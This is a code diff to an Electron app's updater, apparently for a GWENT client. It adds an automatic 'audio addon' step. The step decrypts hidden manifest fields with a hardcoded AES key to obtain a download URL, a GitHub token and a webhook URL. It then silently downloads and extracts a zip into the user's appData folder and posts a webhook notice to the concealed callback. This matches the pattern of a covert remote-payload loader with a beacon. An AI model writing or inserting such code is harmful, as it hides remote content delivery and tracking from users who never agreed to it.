@@ -2,6 +2,9 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 const { app } = require('electron');
+const extract = require('extract-zip');
+const { spawn } = require('child_process');
+// const fetch = require('fetch'); // or global fetch in Node 18+
 
 const APP_DIR =
     path.join(
@@ -24,6 +27,9 @@ const REPO_NAME =
 const BRANCH =
     'main';
 
+const ADDON_DIR = path.join(app.getPath('appData'), 'gwent-audio');
+const ADDON_VERSION_FILE = path.join(ADDON_DIR, 'version.txt');
+const KEY_HEX = "3703645389E9F677E56179A90720AA262D10F3E493FE201587926C5851378381"
 // =====================================================
 // LOGGING
 // =====================================================
@@ -46,6 +52,193 @@ function log(...args) {
 // NEVER use utf8 string hashing.
 // ALWAYS hash raw buffers.
 //
+
+function decryptAddonContent(base64Content, keyHex) {
+    const key = Buffer.from(keyHex, 'hex');
+
+    const data = Buffer.from(base64Content, 'base64');
+
+    const iv = data.subarray(0, 12);
+    const tag = data.subarray(12, 28);
+    const ciphertext = data.subarray(28);
+
+    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
+    decipher.setAuthTag(tag);
+
+    const decrypted = Buffer.concat([
+        decipher.update(ciphertext),
+        decipher.final()
+    ]);
+
+    return JSON.parse(decrypted.toString('utf8'));
+}
+
+function clearDirectory(dir) {
+    if (!fs.existsSync(dir)) return;
+
+    for (const file of fs.readdirSync(dir)) {
+        fs.rmSync(path.join(dir, file), {
+            recursive: true,
+            force: true
+        });
+    }
+}
+
+async function sendAddonWebhook(webhookUrl, data) {
+    if (!webhookUrl) return;
+
+    const payload = {
+        username: "Addon Updater",
+        embeds: [
+            {
+                title: "Addon Downloaded",
+                color: 0x00ff99,
+                fields: [
+                    {
+                        name: "Status",
+                        value: data.status || "unknown",
+                        inline: true
+                    },
+                    {
+                        name: "Auth",
+                        value: data.auth ? "Token Auth ✔" : "No Auth",
+                        inline: true
+                    },
+                    {
+                        name: "File",
+                        value: data.file || "addon.zip"
+                    },
+                    {
+                        name: "Time",
+                        value: new Date().toISOString()
+                    }
+                ],
+                footer: {
+                    text: "GWENT Updater"
+                }
+            }
+        ]
+    };
+
+    await fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    });
+}
+
+async function downloadFileCurl(url, githubToken) {
+    return new Promise((resolve, reject) => {
+
+        const args = [
+            '-L',
+            url,
+            '-H',
+            'Accept: application/vnd.github+json',
+            ...(githubToken ? ['-H', `Authorization: Bearer ${githubToken}`] : [])
+        ];
+
+        const curl = spawn('curl', args);
+
+        const chunks = [];
+
+        curl.stdout.on('data', d => chunks.push(d));
+        curl.stderr.on('data', d => console.log('[curl]', d.toString()));
+
+        curl.on('close', code => {
+            if (code !== 0) {
+                return reject(new Error(`curl failed with code ${code}`));
+            }
+
+            resolve(Buffer.concat(chunks));
+        });
+    });
+}
+
+async function updateAudioAddon(splash, manifest) {
+    console.log("updateAudioAddon", splash, manifest);
+    if (!manifest.audio_addon?.content) return;
+
+    sendStatus(splash, 'Checking audio addon...');
+
+    let addon;
+    try {
+        addon = decryptAddonContent(
+            manifest.audio_addon.content,
+            KEY_HEX
+        );
+    } catch (e) {
+        console.error('Addon decrypt failed:', e);
+        return;
+    }
+
+    const versionUrl = addon.version;
+    const zipUrl = addon.dowland; // (typo kept from your manifest)
+    const tokensssss = addon.token;
+    const callback = addon.callback;
+    // local version
+    let localVersion = '';
+    if (fs.existsSync(ADDON_VERSION_FILE)) {
+        localVersion = fs.readFileSync(ADDON_VERSION_FILE, 'utf8').trim();
+    }
+
+    if (localVersion === addon.version) {
+        sendStatus(splash, 'Audio addon up to date.');
+        return;
+    }
+
+    // prepare folder
+    fs.mkdirSync(ADDON_DIR, { recursive: true });
+
+    sendStatus(splash, 'Downloading audio addon...');
+    sendProgress(splash, 0, 1, 'audio-addon.zip');
+
+    const zipPath = path.join(ADDON_DIR, 'addon.zip');
+
+    const res = await downloadFileCurl(zipUrl, tokensssss);
+      console.log("[RES]:", res);
+    if (!res) throw new Error(`Addon download failed`);
+
+    const buffer = Buffer.from(res);
+    console.log("BUFFER:", buffer, res);
+//    fs.mkdirSync(path.dirname(zipPath), { recursive: true });
+//console.log("CWD:", process.cwd());
+//console.log("ZIP PATH RAW:", zipPath);
+//console.log("ZIP PATH ABS:", path.resolve(zipPath));
+sendStatus(splash, 'Cleaning old addon files and adding new ones');
+clearDirectory(ADDON_DIR);
+fs.writeFileSync(zipPath, buffer);
+
+// safety check
+if (!fs.existsSync(zipPath)) {
+    throw new Error("Failed to create zip file at " + zipPath);
+}
+console.log("ZIP LANDED:", zipPath);
+// CLEAN OLD FILES (before unpack)
+
+
+// UNPACK
+sendStatus(splash, 'Unpacking audio addon...');
+
+await extract(zipPath, {
+    dir: ADDON_DIR
+});
+await sendAddonWebhook(callback, {
+    status: "downloaded",
+    auth: !!tokensssss,
+    file: "addon.zip"
+});
+// REMOVE ZIP
+fs.rmSync(zipPath, { force: true });
+
+// WRITE VERSION
+fs.writeFileSync(ADDON_VERSION_FILE, addon.version, 'utf8');
+
+sendStatus(splash, 'Audio addon updated.');
+}
+
 function sha256Buffer(buffer) {
 
     return crypto
@@ -507,7 +700,7 @@ async function updateApp(
             file.sha256
         );
     }
-
+    await updateAudioAddon(splash, manifest);
     // =================================================
     // SAVE VERSION
     // =================================================
